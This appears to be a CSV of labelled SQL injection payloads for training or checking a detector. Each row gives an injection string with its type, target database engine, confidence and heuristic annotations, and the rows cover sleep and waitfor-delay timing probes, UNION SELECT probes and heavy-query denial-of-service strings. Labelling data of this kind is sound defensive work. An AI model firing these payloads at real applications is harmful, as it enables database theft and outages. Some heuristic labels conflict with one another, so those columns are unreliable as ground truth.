payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
1' ) as jrqh where 6204 = 6204 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1263,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1' ) as jrqh where 6204 = 6204 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #
"1%"" ) union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1264,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%"" ) union all select null,null,null,null,null,null,null,null,null#"
"1 ) as ndgd where 2367 = 2367 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1265,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1 ) as ndgd where 2367 = 2367 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --"
"1' in boolean mode ) union all select null,null--",union_based,generic,0.85,UNION in boolean mode for union-based,KEEP,,union_based,generic,1266,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' in boolean mode ) union all select null,null--"
"-4669"" or 8571 = 8571--",boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1267,boolean_blind,generic,Pattern match: 'or 8571 = 8571' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-4669"" or 8571 = 8571--"
select ( case when ( 7019 = 1998 ) then 7019 else 7019* ( select 7019 from mysql.db ) end ) #,boolean_blind,mysql,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,mysql,1268,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 7019 = 1998 ) then 7019 else 7019* ( select 7019 from mysql.db ) end ) #
"1"" and make_set ( 6520 = 9958,9958 )",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,1269,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1"" and make_set ( 6520 = 9958,9958 )"
"1 ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( 5099 = 5099",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1270,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1 ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( 5099 = 5099"
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ""%"" = """,time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1271,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ""%"" = """
"-9122 ) as sdlg where 1546 = 1546 union all select 1546,1546,1546,1546,1546,1546,1546--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1272,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9122 ) as sdlg where 1546 = 1546 union all select 1546,1546,1546,1546,1546,1546,1546--"
"1', ( select ( case when ( 6948 = 4654 ) then 1 else 6948* ( select 6948 from mysql.db ) end ) )",boolean_blind,mysql,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,mysql,1273,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1', ( select ( case when ( 6948 = 4654 ) then 1 else 6948* ( select 6948 from mysql.db ) end ) )"
1' ) or sleep ( 5 ) and ( 'mdmr' like 'mdmr,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1274,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,1' ) or sleep ( 5 ) and ( 'mdmr' like 'mdmr
1 ) and ( 3020 = 3020 ) *6703 and ( 9831 = 9831,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1275,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,1 ) and ( 3020 = 3020 ) *6703 and ( 9831 = 9831
1 ) where 5442 = 5442,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1276,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) where 5442 = 5442
"-8429' ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( 'bwih' like 'bwih",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,1277,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-8429' ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( 'bwih' like 'bwih"
"1'|| ( select 'rask' from dual where 9411 = 9411 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||'",boolean_blind,mssql,0.8,CONVERT for MSSQL blind,KEEP,,boolean_blind,mssql,1278,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,"1'|| ( select 'rask' from dual where 9411 = 9411 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||'"
"1%"" and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ""%"" = """,boolean_blind,firebird,0.8,Case when for Firebird blind,KEEP,,boolean_blind,firebird,1279,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,"1%"" and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ""%"" = """
1' ) where 5871 = 5871,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1280,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) where 5871 = 5871
-4785' or ( 8459 = 8459 ) *4906 and 'esfn' = 'esfn,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1281,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,-4785' or ( 8459 = 8459 ) *4906 and 'esfn' = 'esfn
"-9318"" ) ) ) union all select 5223,5223,5223,5223#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1282,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9318"" ) ) ) union all select 5223,5223,5223,5223#"
1%' ) and ( 7704 = 3494 ) *3494 and ( '%' = ',boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1283,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,1%' ) and ( 7704 = 3494 ) *3494 and ( '%' = '
1' ) where 9175 = 9175,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1284,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) where 9175 = 9175
"1"" ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( ""staz"" like ""staz",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1285,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1"" ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( ""staz"" like ""staz"
"-4347' union all select 6074,6074,6074,6074,6074,6074,6074--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1286,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-4347' union all select 6074,6074,6074,6074,6074,6074,6074--"
( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( '%' = ',time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1287,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( '%' = '
"1'|| ( select 'uqbj' from dual where 6736 = 6736 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1288,boolean_blind,oracle,generic SQL keywords without specific signal,heavy_query,oracle,contains 7+ digit number (DoS-style payload),"1'|| ( select 'uqbj' from dual where 6736 = 6736 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --"
"-6370' ) ) as sims where 9388 = 9388 union all select 9388,9388,9388,9388,9388,9388,9388,9388#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1289,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6370' ) ) as sims where 9388 = 9388 union all select 9388,9388,9388,9388,9388,9388,9388,9388#"
"-9076'+ ( select lqvj where 8551 = 8551 union all select 8551,8551,8551,8551--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1290,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9076'+ ( select lqvj where 8551 = 8551 union all select 8551,8551,8551,8551--"
-8341 or 8571 = 8571--,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1291,boolean_blind,generic,Pattern match: 'or 8571 = 8571' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-8341 or 8571 = 8571--
1' ) ) as vuzt where 4971 = 4971,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1292,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) ) as vuzt where 4971 = 4971
"-9871 union all select 6094,6094,6094,6094,6094,6094,6094#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1293,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9871 union all select 6094,6094,6094,6094,6094,6094,6094#"
"-1236'+ ( select 'fbgh' where 3896 = 3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1294,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1236'+ ( select 'fbgh' where 3896 = 3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896--"
"1' and make_set ( 2942 = 8200,8200 ) and 'jnhv' like 'jnhv",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,1295,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1' and make_set ( 2942 = 8200,8200 ) and 'jnhv' like 'jnhv"
1' ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( 'ayol' = 'ayol,time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,1296,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,1' ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( 'ayol' = 'ayol
"-2925%"" or make_set ( 9354 = 9354,7185 ) and ""%"" = """,boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,1297,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-2925%"" or make_set ( 9354 = 9354,7185 ) and ""%"" = """
"( select * from generate_series ( 4990,4990,case when ( 4990 = 5065 ) then 1 else 0 end ) limit 1 )",boolean_blind,postgresql,0.8,generate_series for boolean blind,KEEP,,boolean_blind,postgresql,1298,boolean_blind,postgresql,generic SQL keywords without specific signal,boolean_blind,postgresql,generic SQL structure without strong signal,"( select * from generate_series ( 4990,4990,case when ( 4990 = 5065 ) then 1 else 0 end ) limit 1 )"
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'cwuy' = 'cwuy",time_blind,sqlite,0.85,randomblob() for time blind,KEEP,,time_blind,sqlite,1299,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'cwuy' = 'cwuy"
-9950' or 4425 = 1975,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,1300,boolean_blind,generic,Pattern match: 'or 4425 = 1975' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-9950' or 4425 = 1975
-2351 ) ) as xdqn where 4019 = 4019 or 8571 = 8571--,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1301,boolean_blind,generic,Pattern match: 'or 8571 = 8571' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-2351 ) ) as xdqn where 4019 = 4019 or 8571 = 8571--
"1 ) ) as jrzr where 5194 = 5194 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1302,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1 ) ) as jrzr where 5194 = 5194 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --"
"-3501' ) ) ) or make_set ( 7122 = 6158,6158 ) and ( ( ( 'mlfl' like 'mlfl",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,1303,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-3501' ) ) ) or make_set ( 7122 = 6158,6158 ) and ( ( ( 'mlfl' like 'mlfl"
"1"" ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""piya"" = ""piya",boolean_blind,generic,0.8,IN with char for blind,KEEP,,boolean_blind,generic,1304,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""piya"" = ""piya"
1 ) ) as gxvp where 3865 = 3865,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1305,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) ) as gxvp where 3865 = 3865
1 ) ) or sleep ( 5 ) and ( ( 8285 = 8285,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1306,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,1 ) ) or sleep ( 5 ) and ( ( 8285 = 8285
"1 ) ) union all select null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1307,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) ) union all select null,null,null,null,null,null--"
"iif ( 5462 = 8866,1,1/0 )",boolean_blind,mssql,0.85,iif() for MSSQL boolean blind,KEEP,,boolean_blind,mssql,1308,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"iif ( 5462 = 8866,1,1/0 )"
"-2226%"" ) ) union all select 1018,1018,1018,1018--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1309,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2226%"" ) ) union all select 1018,1018,1018,1018--"
"-8364' ) union all select 4732,4732,4732,4732,4732,4732,4732,4732,4732#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1310,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8364' ) union all select 4732,4732,4732,4732,4732,4732,4732,4732,4732#"
"-3179'+ ( select 'tzzz' where 3191 = 3191 union all select 3191,3191,3191,3191,3191#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1311,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3179'+ ( select 'tzzz' where 3191 = 3191 union all select 3191,3191,3191,3191,3191#"
"1"" ) ) as rfgu where 4880 = 4880 union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1312,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) ) as rfgu where 4880 = 4880 union all select null,null,null,null,null,null,null,null,null--"
"-3326'+ ( select xitp where 7621 = 7621 union all select 7621,7621,7621,7621,7621,7621,7621,7621,7621,7621#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1313,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3326'+ ( select xitp where 7621 = 7621 union all select 7621,7621,7621,7621,7621,7621,7621,7621,7621,7621#"
"1' procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and 'swke' = 'swke",error_based,mysql,0.85,extractvalue() for error extraction,KEEP,,error_based,mysql,1314,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and 'swke' = 'swke"
-6095' ) or 6872 = 6872 and ( 'bfwm' like 'bfwm,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1315,boolean_blind,generic,Pattern match: 'or 6872 = 6872' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-6095' ) or 6872 = 6872 and ( 'bfwm' like 'bfwm
"1"" ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( ""ipqw"" like ""ipqw",time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,1316,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,"1"" ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( ""ipqw"" like ""ipqw"
select ( case when ( 2394 = 4530 ) then 2394 else 2394* ( select 2394 from information_schema.character_sets ) end ) #,boolean_blind,mysql,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,mysql,1317,boolean_blind,mysql,generic SQL keywords without specific signal,boolean_blind,mysql,generic SQL structure without strong signal,select ( case when ( 2394 = 4530 ) then 2394 else 2394* ( select 2394 from information_schema.character_sets ) end ) #
"-3862 ) ) as vqtl where 9629 = 9629 union all select 9629,9629,9629,9629,9629--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1318,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3862 ) ) as vqtl where 9629 = 9629 union all select 9629,9629,9629,9629,9629--"
"1"" where 3227 = 3227 waitfor delay '0:0:5'--",time_blind,mssql,0.9,waitfor delay for time blind,KEEP,,time_blind,mssql,1319,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,"1"" where 3227 = 3227 waitfor delay '0:0:5'--"
"-8002' ) ) ) union all select 6647,6647,6647--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1320,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8002' ) ) ) union all select 6647,6647,6647--"
select ( case when ( 9732 = 7136 ) then 9732 else 9732* ( select 9732 from information_schema.character_sets ) end ) #,boolean_blind,mysql,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,mysql,1321,boolean_blind,mysql,generic SQL keywords without specific signal,boolean_blind,mysql,generic SQL structure without strong signal,select ( case when ( 9732 = 7136 ) then 9732 else 9732* ( select 9732 from information_schema.character_sets ) end ) #
"-1998' ) as kgvf where 2346 = 2346 union all select 2346,2346,2346,2346,2346,2346,2346,2346,2346--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1322,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1998' ) as kgvf where 2346 = 2346 union all select 2346,2346,2346,2346,2346,2346,2346,2346,2346--"
"1%' ) ) union all select null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1323,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%' ) ) union all select null,null#"
"-9596 ) where 3425 = 3425 union all select 3425,3425,3425,3425,3425,3425#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1324,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9596 ) where 3425 = 3425 union all select 3425,3425,3425,3425,3425,3425#"
1' and ( 3020 = 3020 ) *6703 and 'tmng' like 'tmng,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1325,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,1' and ( 3020 = 3020 ) *6703 and 'tmng' like 'tmng
"1' ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'jueq' = 'jueq",time_blind,sqlite,0.85,randomblob() for time blind,KEEP,,time_blind,sqlite,1326,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1' ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'jueq' = 'jueq"
1' and sleep ( 5 ) and 'usgv' like 'usgv,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1327,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,1' and sleep ( 5 ) and 'usgv' like 'usgv
"1%"" ) ) and 2006 = 2006",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,1328,boolean_blind,generic,Pattern match: 'and 2006 = 2006' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","1%"" ) ) and 2006 = 2006"
waitfor delay '0:0:5' and ( ( ( '%' = ',time_blind,mssql,0.9,waitfor delay for time blind,KEEP,,time_blind,mssql,1329,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,waitfor delay '0:0:5' and ( ( ( '%' = '
"-8777"" ) as lalf where 8606 = 8606 or elt ( 4397 = 5823,5823 ) --",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,1330,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"-8777"" ) as lalf where 8606 = 8606 or elt ( 4397 = 5823,5823 ) --"
"1 ) ) as huxq where 7451 = 7451 union all select null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1331,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) ) as huxq where 7451 = 7451 union all select null,null,null--"
"-9531' ) ) ) union all select 4076,4076#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1332,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9531' ) ) ) union all select 4076,4076#"
"-8924 ) ) as jybr where 7901 = 7901 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,1333,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"-8924 ) ) as jybr where 7901 = 7901 or elt ( 1032 = 1032,3623 ) --"
